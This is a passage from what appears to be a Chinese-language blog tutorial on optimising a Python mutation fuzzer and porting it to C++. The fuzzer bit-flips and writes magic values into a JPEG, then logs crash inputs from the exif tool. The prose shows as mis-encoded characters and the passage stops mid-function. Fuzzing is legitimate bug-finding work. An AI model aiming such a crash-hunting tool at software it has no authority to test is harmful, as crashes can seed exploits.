data</code></pre><p>è¯šç„¶ï¼Œè¿™ä¸ªå‡½æ•°æœ‰ç‚¹ç¬¨æ‹™ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ›´å¥½çš„é€»è¾‘æ¥å¤§å¤§ç®€åŒ–å®ƒï¼Œæˆ‘å‘ç°åœ¨æˆ‘æœ‰é™çš„ç¼–ç¨‹ç»å†ä¸­ç»å¸¸ä¼šå‡ºç°ä¸‹é¢è¿™ç§æƒ…å†µï¼Œä½ å°½å¯ä»¥ç”¨ä½ æƒ³è¦çš„æ‰€æœ‰èŠ±å“¨çš„æ·±å¥¥çš„ç¼–ç¨‹çŸ¥è¯†ï¼Œä½†æ˜¯å¦‚æœä½ ç¼–ç¨‹èƒŒåçš„é€»è¾‘æ˜¯ä¸å¥å…¨çš„ï¼Œé‚£ä¹ˆç¨‹åºçš„æ€§èƒ½å°±ä¼šå—åˆ°å½±å“ã€‚</p><p>è®©æˆ‘ä»¬å‡å°‘æˆ‘ä»¬æ‰€åšçš„ç±»å‹è½¬æ¢çš„æ•°é‡ï¼Œä¾‹å¦‚ä»<code>int</code>è½¬æˆ<code>str</code>æˆ–è€…åè¿‡æ¥ï¼Œè®©æˆ‘ä»¬åœ¨ç¼–è¯‘å™¨ä¸­ç”¨æ›´å°‘çš„ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é‡æ–°å®šä¹‰çš„<code>bit_flip()</code>å®Œæˆæˆ‘ä»¬æƒ³è¦çš„ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bit_flip</span>(<span class="hljs-params">data</span>):</span>    length = len(data) - <span class="hljs-number">4</span>    num_of_flips = int(length * <span class="hljs-number">.01</span>)    picked_indexes = []        flip_array = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">8</span>,<span class="hljs-number">16</span>,<span class="hljs-number">32</span>,<span class="hljs-number">64</span>,<span class="hljs-number">128</span>]    counter = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> counter &lt; num_of_flips:        picked_indexes.append(random.choice(range(<span class="hljs-number">0</span>,length)))        counter += <span class="hljs-number">1</span>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> picked_indexes:        mask = random.choice(flip_array)        data[x] = data[x] ^ mask    <span class="hljs-keyword">return</span> data</code></pre><p>å¦‚æœæˆ‘ä»¬ä½¿ç”¨è¿™ä¸ªæ–°çš„å‡½æ•°å¹¶ç›‘æ§ç»“æœï¼Œæˆ‘ä»¬å°†è·å¾—ä»¥ä¸‹çš„æ€§èƒ½ç­‰çº§ï¼š</p><pre><code class="hljs yaml"><span class="hljs-number">59376275</span> <span class="hljs-string">function</span> <span class="hljs-string">calls</span> <span class="hljs-string">(59376138</span> <span class="hljs-string">primitive</span> <span class="hljs-string">calls)</span> <span class="hljs-string">in</span> <span class="hljs-number">135.582</span> <span class="hljs-string">seconds</span>   <span class="hljs-attr">Ordered by:</span> <span class="hljs-string">cumulative</span> <span class="hljs-string">time</span>   <span class="hljs-string">ncalls</span>  <span class="hljs-string">tottime</span>  <span class="hljs-string">percall</span>  <span class="hljs-string">cumtime</span>  <span class="hljs-string">percall</span> <span class="hljs-string">filename:lineno(function)</span>     <span class="hljs-number">15</span><span class="hljs-string">/1</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">135.582</span>  <span class="hljs-number">135.582</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">builtins.exec</span>&#125;        <span class="hljs-number">1</span>    <span class="hljs-number">1.940</span>    <span class="hljs-number">1.940</span>  <span class="hljs-number">135.582</span>  <span class="hljs-number">135.582</span> <span class="hljs-string">subpro.py:3(&lt;module&gt;)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">0.978</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">107.857</span>    <span class="hljs-number">0.002</span> <span class="hljs-string">subpro.py:111(exif)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">1.450</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">64.236</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">subprocess.py:681(__init__)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">5.566</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">60.141</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">subprocess.py:1412(_execute_child)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">0.534</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">42.259</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">subprocess.py:920(communicate)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">2.827</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">41.637</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">subprocess.py:1662(_communicate)</span>   <span class="hljs-number">199549</span>   <span class="hljs-number">38.249</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">38.249</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">posix.read</span>&#125;   <span class="hljs-number">149537</span>    <span class="hljs-number">0.555</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">30.376</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">selectors.py:402(select)</span>   <span class="hljs-number">149537</span>   <span class="hljs-number">29.722</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">29.722</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;poll&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;select.poll&#x27;</span> <span class="hljs-string">objects</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">3.993</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">14.471</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subpro.py:14(bit_flip)</span>  <span class="hljs-number">7950000</span>    <span class="hljs-number">3.741</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">10.316</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">random.py:256(choice)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">9.973</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">9.973</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">_posixsubprocess.fork_exec</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">0.163</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">7.034</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subpro.py:105(create_new)</span>  <span class="hljs-number">7950000</span>    <span class="hljs-number">3.987</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">5.952</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">random.py:224(_randbelow)</span>   <span class="hljs-number">202567</span>    <span class="hljs-number">4.966</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">4.966</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">io.open</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">4.042</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">4.042</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;close&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;_io.BufferedRandom&#x27;</span> <span class="hljs-string">objects</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">1.539</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">3.828</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">os.py:617(get_exec_path)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">1.843</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">3.607</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subpro.py:8(get_bytes)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">0.074</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">2.133</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subprocess.py:1014(wait)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">0.463</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">2.059</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subprocess.py:1621(_wait)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">0.274</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">2.046</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">selectors.py:351(register)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">0.782</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.702</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">selectors.py:234(register)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">0.055</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.507</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subprocess.py:1608(_try_wait)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">1.452</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.452</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">posix.waitpid</span>&#125;   <span class="hljs-number">350000</span>    <span class="hljs-number">0.424</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.436</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subprocess.py:1471(&lt;genexpr&gt;)</span> <span class="hljs-number">12066317</span>    <span class="hljs-number">1.339</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.339</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;getrandbits&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;_random.Random&#x27;</span> <span class="hljs-string">objects</span>&#125;   <span class="hljs-number">100000</span>    <span class="hljs-number">0.466</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.048</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">os.py:674(__getitem__)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">1.014</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.014</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;close&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;_io.BufferedReader&#x27;</span> <span class="hljs-string">objects</span>&#125;<span class="hljs-string">-----SNIP-----</span></code></pre><p>ä»æŒ‡æ ‡ä¸­å¯ä»¥çœ‹å‡ºï¼Œæ­¤æ—¶æˆ‘ä»¬åœ¨<code>bit_flip()</code>ä¸­åªèŠ±äº†14ç§’çš„ç´¯è®¡æ—¶é—´ï¼åœ¨æˆ‘ä»¬æœ€åä¸€è½®ä¸­ï¼Œè¿™ä¸ªå°†è¿‘èŠ±è´¹äº†25ç§’ï¼Œåœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œè¿™å‡ ä¹æ˜¯ä¸¤å€çš„é€Ÿåº¦äº†ï¼Œåœ¨æˆ‘çœ‹æ¥ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œçš„ä¼˜åŒ–å·¥ä½œåšå¾—å¾ˆå¥½ã€‚</p><p>ç°åœ¨æˆ‘ä»¬æœ‰äº†æˆ‘ä»¬ç†æƒ³çš„<code>Python</code>åŸºå‡†æµ‹è¯•ï¼ˆè¯·è®°ä½ï¼Œè¿™é‡Œå¯èƒ½ä¼šæœ‰å¤šè¿›ç¨‹æˆ–å¤šçº¿ç¨‹çš„æœºä¼šï¼Œä½†æˆ‘ä»¬æŠŠè¿™ä¸ªæƒ³æ³•ç•™åœ¨ä¸‹æ¬¡ï¼‰ï¼Œè®©æˆ‘ä»¬ç»§ç»­æŠŠæˆ‘ä»¬çš„<code>fuzzer</code>ç§»æ¤åˆ°ä¸€ä¸ªæ–°çš„è¯­è¨€<code>c++</code>ï¼Œå¹¶æµ‹è¯•å…¶æ€§èƒ½ã€‚</p><h2 id="New-Fuzzer-in-C"><a href="#New-Fuzzer-in-C" class="headerlink" title="New Fuzzer in C++"></a>New Fuzzer in C++</h2><p>é¦–å…ˆï¼Œè®©æˆ‘ä»¬ç»§ç»­è¿è¡Œæˆ‘ä»¬æ–°ä¼˜åŒ–çš„<code>python fuzzer</code>ï¼Œå¹¶å°†å…¶è¿è¡Œ<code>100k</code>æ¬¡<code>fuzzing</code>è¿­ä»£ï¼Œçœ‹çœ‹éœ€è¦å¤šé•¿æ—¶é—´ã€‚</p><p><code>118749892 function calls (118749755 primitive calls) in 256.881 seconds</code></p><p>100kæ¬¡è¿­ä»£ä»…éœ€256sï¼è¿™æ€§èƒ½æ‘§æ¯äº†æˆ‘ä»¬ä¹‹å‰å†™çš„<code>fuzzer</code></p><p>è¿™å°†æ˜¯æˆ‘ä»¬ç”¨<code>c++</code>å®ç°å°è¯•è¦æ‰“è´¥çš„åŸºå‡†æµ‹è¯•ï¼Œç°åœ¨ï¼Œå°±åƒæˆ‘å¯¹<code>Python</code>å¼€å‘çš„ç»†å¾®ç‚¹çš„ä¸ç†Ÿæ‚‰ç¨‹åº¦ï¼Œå°†å…¶ä¹˜åï¼Œä½ å°±ä¼šå‘ç°ï¼Œæˆ‘å¯¹<code>c++</code>ä¸ç†Ÿæ‚‰çš„ç¨‹åº¦äº†ï¼Œè¿™æ®µä»£ç æˆ–è®¸ä¼šè´»ç¬‘å¤§æ–¹ï¼Œä½†æ˜¯è¿™æ˜¯æˆ‘ç›®å‰èƒ½åšçš„æœ€å¥½çš„ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹åº”æˆ‘ä»¬ä¹‹å‰çš„<code>Python</code>ä»£ç è§£é‡Šæ¯ä¸ªå‡½æ•°ã€‚</p><p>è®©æˆ‘ä»¬é€ä¸ªå‡½æ•°æ¥çœ‹çœ‹ï¼Œç„¶åæè¿°å…¶å®ç°</p><pre><code class="hljs c++"><span class="hljs-comment">//</span><span class="hljs-comment">// this function simply creates a stream by opening a file in binary mode;</span><span class="hljs-comment">// finds the end of file, creates a string &#x27;data&#x27;, resizes data to be the same</span><span class="hljs-comment">// size as the file moves the file pointer back to the beginning of the file;</span><span class="hljs-comment">// reads the data from the into the data string;</span><span class="hljs-comment">//</span><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> <span class="hljs-title">get_bytes</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> filename)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-function"><span class="hljs-built_in">std</span>::ifstream <span class="hljs-title">fin</span><span class="hljs-params">(filename, <span class="hljs-built_in">std</span>::ios::binary)</span></span>;    <span class="hljs-keyword">if</span> (fin.is_open())    &#123;        fin.seekg(<span class="hljs-number">0</span>, <span class="hljs-built_in">std</span>::ios::<span class="hljs-built_in">end</span>);        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> data;        data.resize(fin.tellg());        fin.seekg(<span class="hljs-number">0</span>, <span class="hljs-built_in">std</span>::ios::beg);        fin.<span class="hljs-built_in">read</span>(&amp;data[<span class="hljs-number">0</span>], data.<span class="hljs-built_in">size</span>());        <span class="hljs-keyword">return</span> data;    &#125;    <span class="hljs-keyword">else</span>    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Failed to open &quot;</span> &lt;&lt; filename &lt;&lt; <span class="hljs-string">&quot;.\n&quot;</span>;        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);    &#125;&#125;</code></pre><p>è¿™ä¸ªå‡½æ•°å¦‚æˆ‘çš„æ³¨é‡Šæ‰€å†™ï¼Œä»…ä»æˆ‘ä»¬çš„ç›®æ ‡æ–‡ä»¶ä¸­æ£€ç´¢ä¸€ä¸ªå­—èŠ‚çš„ä¸²ï¼Œåœ¨æˆ‘ä»¬çš„æµ‹è¯•æƒ…å†µä¸‹ï¼Œè¿™ä¸ªæ–‡ä»¶ä»å°†ä¸º<code>Canon_40D.jpg</code></p><pre><code class="hljs c++"><span class="hljs-comment">//</span><span class="hljs-comment">// this will take 1% of the bytes from our valid jpeg and</span><span class="hljs-comment">// flip a random bit in the byte and return the altered string</span><span class="hljs-comment">//</span><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> <span class="hljs-title">bit_flip</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> data)</span></span><span class="hljs-function"></span>&#123;        <span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span> = (data.length() - <span class="hljs-number">4</span>);    <span class="hljs-keyword">int</span> num_of_flips = (<span class="hljs-keyword">int</span>)(<span class="hljs-built_in">size</span> * <span class="hljs-number">.01</span>);    <span class="hljs-comment">// get a vector full of 1% of random byte indexes</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; picked_indexes;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; num_of_flips; i++)    &#123;        <span class="hljs-keyword">int</span> picked_index = rand() % <span class="hljs-built_in">size</span>;        picked_indexes.push_back(picked_index);    &#125;    <span class="hljs-comment">// iterate through the data string at those indexes and flip a bit</span>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; picked_indexes.<span class="hljs-built_in">size</span>(); ++i)    &#123;        <span class="hljs-keyword">int</span> index = picked_indexes[i];        <span class="hljs-keyword">char</span> current = data.at(index);        <span class="hljs-keyword">int</span> decimal = ((<span class="hljs-keyword">int</span>)current &amp; <span class="hljs-number">0xff</span>);                <span class="hljs-keyword">int</span> bit_to_flip = rand() % <span class="hljs-number">8</span>;                decimal ^= <span class="hljs-number">1</span> &lt;&lt; bit_to_flip;        decimal &amp;= <span class="hljs-number">0xff</span>;                data[index] = (<span class="hljs-keyword">char</span>)decimal;    &#125;    <span class="hljs-keyword">return</span> data;&#125;</code></pre><p>è¿™ä¸ªå‡½æ•°ç›´æ¥ç­‰åŒäºæˆ‘ä»¬<code>Python</code>è„šæœ¬ä¸­çš„<code>bit_flip()</code>å‡½æ•°</p><pre><code class="hljs c++"><span class="hljs-comment">//</span><span class="hljs-comment">// takes mutated string and creates new jpeg with it;</span><span class="hljs-comment">//</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">create_new</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> mutated)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-function"><span class="hljs-built_in">std</span>::ofstream <span class="hljs-title">fout</span><span class="hljs-params">(<span class="hljs-string">&quot;mutated.jpg&quot;</span>, <span class="hljs-built_in">std</span>::ios::binary)</span></span>;    <span class="hljs-keyword">if</span> (fout.is_open())    &#123;        fout.seekp(<span class="hljs-number">0</span>, <span class="hljs-built_in">std</span>::ios::beg);        fout.<span class="hljs-built_in">write</span>(&amp;mutated[<span class="hljs-number">0</span>], mutated.<span class="hljs-built_in">size</span>());    &#125;    <span class="hljs-keyword">else</span>    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Failed to create mutated.jpg&quot;</span> &lt;&lt; <span class="hljs-string">&quot;.\n&quot;</span>;        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);    &#125;&#125;</code></pre><p>è¿™ä¸ªå‡½æ•°å°†ç®€å•åœ°åˆ›å»ºä¸€ä¸ª<code>mutated.jpg</code>æ–‡ä»¶ï¼Œè·Ÿæˆ‘ä»¬<code>Python</code>è„šæœ¬ä¸­çš„<code>create_new()</code>å‡½æ•°ç±»ä¼¼</p><pre><code class="hljs c++"><span class="hljs-comment">//</span><span class="hljs-comment">// function to run a system command and store the output as a string;</span><span class="hljs-comment">// https://www.jeremymorgan.com/tutorials/c-programming/how-to-capture-the-output-of-a-linux-command-in-c/</span><span class="hljs-comment">//</span><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> <span class="hljs-title">get_output</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> cmd)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> output;    FILE * stream;    <span class="hljs-keyword">char</span> <span class="hljs-built_in">buffer</span>[<span class="hljs-number">256</span>];    stream = popen(cmd.c_str(), <span class="hljs-string">&quot;r&quot;</span>);    <span class="hljs-keyword">if</span> (stream)    &#123;        <span class="hljs-keyword">while</span> (!feof(stream))            <span class="hljs-keyword">if</span> (fgets(<span class="hljs-built_in">buffer</span>, <span class="hljs-number">256</span>, stream) != <span class="hljs-literal">NULL</span>) output.append(<span class="hljs-built_in">buffer</span>);                pclose(stream);    &#125;    <span class="hljs-keyword">return</span> output;&#125;<span class="hljs-comment">//</span><span class="hljs-comment">// we actually run our exiv2 command via the get_output() func;</span><span class="hljs-comment">// retrieve the output in the form of a string and then we can parse the string;</span><span class="hljs-comment">// we&#x27;ll save all the outputs that result in a segfault or floating point except;</span><span class="hljs-comment">//</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">exif</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> mutated, <span class="hljs-keyword">int</span> counter)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> command = <span class="hljs-string">&quot;exif mutated.jpg -verbose 2&gt;&amp;1&quot;</span>;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> output = get_output(command);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> segfault = <span class="hljs-string">&quot;Segmentation&quot;</span>;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> floating_point = <span class="hljs-string">&quot;Floating&quot;</span>;    <span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> pos1 = output.<span class="hljs-built_in">find</span>(segfault);    <span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> pos2 = output.<span class="hljs-built_in">find</span>(floating_point);    <span class="hljs-keyword">if</span> (pos1 != <span class="hljs-number">-1</span>)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Segfault!\n&quot;</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">ostringstream</span> oss;        oss &lt;&lt; <span class="hljs-string">&quot;/root/cppcrashes/crash.&quot;</span> &lt;&lt; counter &lt;&lt; <span class="hljs-string">&quot;.jpg&quot;</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> filename = oss.str();        <span class="hljs-function"><span class="hljs-built_in">std</span>::ofstream <span class="hljs-title">fout</span><span class="hljs-params">(filename, <span class="hljs-built_in">std</span>::ios::binary)</span></span>;        <span class="hljs-keyword">if</span> (fout.is_open())            &#123;                fout.seekp(<span class="hljs-number">0</span>, <span class="hljs-built_in">std</span>::ios::beg);                fout.<span class="hljs-built_in">write</span>(&amp;mutated[<span class="hljs-number">0</span>], mutated.<span class="hljs-built_in">size</span>());            &#125;        <span class="hljs-keyword">else</span>        &#123;            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Failed to create &quot;</span> &lt;&lt; filename &lt;&lt; <span class="hljs-string">&quot;.jpg&quot;</span> &lt;&lt; <span class="hljs-string">&quot;.\n&quot;</span>;            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);        &#125;    &#125;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pos2 != <span class="hljs-number">-1</span>)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Floating Point!\n&quot;</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">ostringstream</span> oss;        oss &lt;&lt; <span class="hljs-string">&quot;/root/cppcrashes/crash.&quot;</span> &lt;&lt; counter &lt;&lt; <span class="hljs-string">&quot;.jpg&quot;</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> filename = oss.str();        <span class="hljs-function"><span class="hljs-built_in">std</span>::ofstream <span class="hljs-title">fout</span><span class="hljs-params">(filename, <span class="hljs-built_in">std</span>::ios::binary)</span></span>;        <span class="hljs-keyword">if</span> (fout.is_open())            &#123;                fout.seekp(<span class="hljs-number">0</span>, <span class="hljs-built_in">std</span>::ios::beg);                fout.<span class="hljs-built_in">write</span>(&amp;mutated[<span class="hljs-number">0</span>], mutated.<span class="hljs-built_in">size</span>());            &#125;        <span class="hljs-keyword">else</span>        &#123;            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Failed to create &quot;</span> &lt;&lt; filename &lt;&lt; <span class="hljs-string">&quot;.jpg&quot;</span> &lt;&lt; <span class="hljs-string">&quot;.\n&quot;</span>;            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);        &#125;    &#125;&#125;</code></pre><p>è¿™ä¸¤ä¸ªå‡½æ•°ä¸€èµ·å·¥ä½œï¼Œ<code>get_output</code>å‡½æ•°æ¥æ”¶ä¸€ä¸ª<code>C++</code>å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œå°†åœ¨æ“ä½œç³»ç»Ÿä¸Šè¿è¡Œè¯¥å‘½ä»¤å¹¶æ•è·è¾“å‡ºï¼Œç„¶åï¼Œè¯¥å‡½æ•°å°†è¾“å‡ºä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²è¿”å›ç»™è°ƒç”¨å‡½æ•°<code>exif()</code></p><p><code>exif()</code>å°†æ‹¿åˆ°è¾“å‡ºå¹¶å¯»æ‰¾<code>Segmentation fault</code>æˆ–<code>Floating point exception</code>é”™è¯¯ï¼Œå¦‚æœå‘ç°è¿™äº›è¾“å‡ºï¼Œå°±æŠŠè¿™äº›å­—èŠ‚å†™å…¥ä¸€ä¸ªæ–‡ä»¶å¹¶ä¿å­˜ä¸º<code>crash.&lt;counter&gt;.jpg</code>æ–‡ä»¶ï¼Œä¸æˆ‘ä»¬çš„<code>Python fuzzer</code>éå¸¸ç›¸ä¼¼ã€‚</p><pre><code class="hljs c++"><span class="hljs-comment">//</span><span class="hljs-comment">// simply generates a vector of strings that are our &#x27;magic&#x27; values;</span><span class="hljs-comment">//</span><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; <span class="hljs-title">vector_gen</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; magic;    <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>::string_literals;    magic.push_back(<span class="hljs-string">&quot;\xff&quot;</span>);    magic.push_back(<span class="hljs-string">&quot;\x7f&quot;</span>);    magic.push_back(<span class="hljs-string">&quot;\x00&quot;</span>s);    magic.push_back(<span class="hljs-string">&quot;\xff\xff&quot;</span>);    magic.push_back(<span class="hljs-string">&quot;\x7f\xff&quot;</span>);    magic.push_back(<span class="hljs-string">&quot;\x00\x00&quot;</span>s);    magic.push_back(<span class="hljs-string">&quot;\xff\xff\xff\xff&quot;</span>);    magic.push_back(<span class="hljs-string">&quot;\x80\x00\x00\x00&quot;</span>s);    magic.push_back(<span class="hljs-string">&quot;\x40\x00\x00\x00&quot;</span>s);    magic.push_back(<span class="hljs-string">&quot;\x7f\xff\xff\xff&quot;</span>);    <span class="hljs-keyword">return</span> magic;&#125;<span class="hljs-comment">//</span><span class="hljs-comment">// randomly picks a magic value from the vector and overwrites that many bytes in the image;</span><span class="hljs-comment">//</span><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> <span class="hljs-title">magic</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> data, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; magic)</span></span><span class="hljs-function"></span>&#123;        <span class="hljs-keyword">int</span> vector_size = magic.<span class="hljs-built_in">size</span>();    <span class="hljs-keyword">int</span> picked_magic_index = rand() % vector_size;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> picked_magic = magic[picked_magic_index];    <span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span> = (data.length() - <span class="hljs-number">4</span>);    <span class="hljs-keyword">int</span> picked_data_index = rand() % <span class="hljs-built_in">size</span>;    data.replace(picked_data_index, magic[picked_magic_index].length(), magic[picked_magic_index]);    <span class="hljs-keyword">return</span> data;&#125;<span class="hljs-comment">//</span><span class="hljs-comment">// returns 0 or 1;</span><span class="hljs-comment">//</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">func_pick</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">int</span> result = rand() % <span class="hljs-number">2</span>;    <span class="hljs-keyword">return</span> 